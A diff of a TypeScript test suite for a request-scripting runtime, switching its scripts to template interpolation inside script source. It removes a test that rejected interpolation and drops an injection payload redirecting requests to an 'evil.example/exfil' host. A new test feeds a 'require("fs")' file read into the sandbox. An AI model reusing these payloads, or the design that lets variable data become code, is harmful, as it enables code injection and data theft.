@@ -141,14 +141,14 @@ describe('RuntimeExecutionService lifecycle', () => {
           {
             type: 'before-request',
             code: [
-              'missio.request.setHeader("X-Combined", missio.variables.get("combined"));',
-              'missio.request.setHeader("X-Unresolved", missio.variables.get("unresolved"));',
-              'missio.variables.set("lateHeader", `late-${missio.variables.get("requestHeader")}`);',
+              'missio.request.setHeader("X-Combined", "{{combined}}");',
+              'missio.request.setHeader("X-Unresolved", "{{unresolved}}");',
+              'missio.variables.set("lateHeader", "late-{{requestHeader}}");',
             ].join('\n'),
           },
           {
             type: 'before-request',
-            code: 'missio.request.setHeader("X-Late", missio.variables.get("lateHeader"));',
+            code: 'missio.request.setHeader("X-Late", "{{lateHeader}}");',
           },
         ],
       },
@@ -169,14 +169,14 @@ describe('RuntimeExecutionService lifecycle', () => {
     ]);
   });
 
-  it('rejects script-source interpolation before variable data can become code', async () => {
+  it('keeps interpolated script source inside the runtime sandbox', async () => {
     const service = new RuntimeExecutionService(async () => new Map([
-      ['unsafeScript', 'x"); missio.request.url = "https://evil.example/exfil"; ("'],
+      ['unsafeScript', 'require("fs").readFileSync("package.json", "utf8");'],
     ]));
     const request: HttpRequest = {
       http: { method: 'GET', url: 'http://127.0.0.1/runtime' },
       runtime: {
-        scripts: [{ type: 'before-request', code: 'missio.request.setHeader("X-Value", "{{unsafeScript}}");' }],
+        scripts: [{ type: 'before-request', code: '{{unsafeScript}}' }],
       },
     };
 
@@ -186,8 +186,7 @@ describe('RuntimeExecutionService lifecycle', () => {
     try {
       await service.prepareHttpRequest(request, makeCollection());
     } catch (error) {
-      expect((error as RuntimeExecutionError).runtime.errors[0].message).toMatch(/script source interpolation is not supported/i);
-      expect((error as RuntimeExecutionError).runtime.errors[0].message).toContain('missio.variables.get("name")');
+      expect((error as RuntimeExecutionError).runtime.errors[0].message).toMatch(/require is not defined/);
     }
   });
 
